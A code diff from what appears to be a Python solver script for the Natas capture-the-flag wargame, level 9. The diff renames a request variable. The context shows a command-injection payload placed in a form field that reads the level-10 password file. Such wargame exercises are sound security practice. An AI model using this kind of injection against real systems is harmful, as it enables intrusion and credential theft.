@@ -13,8 +13,8 @@ def get_natas10_password(natas9_password):
     session.auth = ("natas9", natas9_password)
     injection = ";cat /etc/natas_webpass/natas10;"
     data = {"needle": injection, "submit": "true"}
-    request = session.post(URL, data=data)
-    natas10_password = re.findall(r'([a-zA-Z\d]{32})', request.text)[1]
+    response = session.post(URL, data=data)
+    natas10_password = re.findall(r'([a-zA-Z\d]{32})', response.text)[1]
 
     spinner.succeed(text="The password for natas 10 is: " + natas10_password)
 
